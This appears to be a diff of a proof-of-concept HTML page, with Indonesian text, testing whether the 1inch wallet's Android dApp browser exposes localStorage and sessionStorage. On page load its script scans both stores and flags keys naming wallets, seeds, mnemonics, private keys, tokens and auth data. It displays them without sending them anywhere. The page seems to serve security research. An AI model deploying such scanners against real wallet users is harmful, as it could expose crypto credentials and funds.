@@ -2,75 +2,105 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>1inch dApp Browser - Storage Access PoC</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>1inch Storage PoC - Android Test</title>
     <style>
-        body { font-family: monospace; background: #111; color: #0f0; padding: 20px; line-height: 1.5; }
-        pre { background: #222; padding: 15px; overflow: auto; max-height: 70vh; }
-        .warning { color: #ff0; font-weight: bold; }
-        .success { color: #0f0; }
+        body { 
+            font-family: monospace; 
+            background: #0a0a0f; 
+            color: #00ff9d; 
+            padding: 15px; 
+            margin: 0; 
+            line-height: 1.4;
+        }
+        button { 
+            width: 100%; 
+            padding: 15px; 
+            margin: 8px 0; 
+            font-size: 16px; 
+            background: #00cc77; 
+            color: black; 
+            border: none; 
+            border-radius: 8px;
+        }
+        pre { 
+            background: #111; 
+            padding: 12px; 
+            border-radius: 6px; 
+            overflow: auto; 
+            white-space: pre-wrap;
+            max-height: 55vh;
+        }
+        .warning { color: #ffcc00; font-weight: bold; }
     </style>
 </head>
 <body>
-    <h1>1inch Wallet dApp Browser Storage Access Proof-of-Concept</h1>
-    <p class="warning">⚠️ Halaman ini dimuat di dalam 1inch dApp Browser</p>
-    
-    <button onclick="scanStorage()">🔍 Scan localStorage + sessionStorage</button>
-    <button onclick="clearAndRescan()">Clear & Rescan</button>
+    <h1>1inch Wallet dApp Browser<br>Storage Access PoC</h1>
+    <p class="warning">⚠️ Test ini dijalankan di dalam 1inch dApp Browser (Android)</p>
 
-    <h2>Hasil Scan Storage:</h2>
-    <pre id="output">Klik tombol untuk scan...</pre>
+    <button onclick="scanAllStorage()">🔍 SCAN SEMUA STORAGE SEKARANG</button>
+    <button onclick="clearStorage()">🗑️ Clear All Storage & Rescan</button>
 
-    <h2>Sensitive Keys Detected:</h2>
-    <pre id="sensitive"></pre>
+    <h2>Hasil Scan localStorage + sessionStorage:</h2>
+    <pre id="output">Menunggu scan...</pre>
+
+    <h2>Sensitive / 1inch Related Keys:</h2>
+    <pre id="sensitive">Belum ada data sensitif terdeteksi...</pre>
 
     <script>
-        function scanStorage() {
+        async function scanAllStorage() {
             const output = document.getElementById('output');
             const sensitiveEl = document.getElementById('sensitive');
-            let result = "=== localStorage ===\n";
+            let result = "";
             let sensitive = "";
 
-            // Scan localStorage
+            // localStorage
+            result += "=== localStorage ===\n";
             for (let i = 0; i < localStorage.length; i++) {
                 const key = localStorage.key(i);
-                const value = localStorage.getItem(key);
-                result += `${key}: ${value ? value.substring(0, 150) + (value.length > 150 ? '...' : '')}\n`;
-                
-                // Deteksi kunci sensitif
-                const lowerKey = key.toLowerCase();
-                if (lowerKey.includes('wallet') || lowerKey.includes('private') || lowerKey.includes('seed') || 
-                    lowerKey.includes('session') || lowerKey.includes('token') || lowerKey.includes('auth') ||
-                    lowerKey.includes('1inch') || lowerKey.includes('account') || lowerKey.includes('provider')) {
-                    sensitive += `🔴 SENSITIVE: ${key} → ${value ? value.substring(0, 100) + '...' : 'null'}\n`;
+                let value = localStorage.getItem(key);
+                if (value && value.length > 200) value = value.substring(0, 200) + '...';
+                result += `${key}: ${value}\n`;
+
+                const k = key.toLowerCase();
+                if (k.includes('1inch') || k.includes('wallet') || k.includes('private') || 
+                    k.includes('seed') || k.includes('session') || k.includes('token') || 
+                    k.includes('auth') || k.includes('account') || k.includes('provider') || 
+                    k.includes('key') || k.includes('mnemonic')) {
+                    sensitive += `🔴 ${key}\n   Value: ${value}\n\n`;
                 }
             }
 
+            // sessionStorage
             result += "\n=== sessionStorage ===\n";
             for (let i = 0; i < sessionStorage.length; i++) {
                 const key = sessionStorage.key(i);
-                const value = sessionStorage.getItem(key);
-                result += `${key}: ${value ? value.substring(0, 150) + '...' : ''}\n`;
+                let value = sessionStorage.getItem(key);
+                if (value && value.length > 200) value = value.substring(0, 200) + '...';
+                result += `${key}: ${value}\n`;
             }
 
-            output.textContent = result;
-            sensitiveEl.textContent = sensitive || "Tidak ditemukan kunci sensitif yang jelas.";
+            output.textContent = result || "Storage kosong.";
 
-            console.log("%c1inch Storage PoC - Semua data di atas berhasil dibaca dari origin dApp ini", "color: yellow; font-size: 14px");
+            sensitiveEl.textContent = sensitive || "Tidak ditemukan kunci sensitif yang jelas dari origin ini.";
+
+            console.log("=== 1inch Android PoC Scan selesai ===");
         }
 
-        function clearAndRescan() {
-            if (confirm("Yakin clear storage? Ini hanya untuk test.")) {
+        function clearStorage() {
+            if (confirm("Clear semua storage?")) {
                 localStorage.clear();
                 sessionStorage.clear();
-                document.getElementById('output').textContent = "Storage telah di-clear. Scan lagi...";
-                scanStorage();
+                alert("Storage dibersihkan. Scan lagi.");
+                scanAllStorage();
             }
         }
 
-        // Auto scan saat load
+        // Auto scan saat halaman load
         window.onload = () => {
-            setTimeout(scanStorage, 800);
+            setTimeout(() => {
+                scanAllStorage();
+            }, 600);
         };
     </script>
 </body>
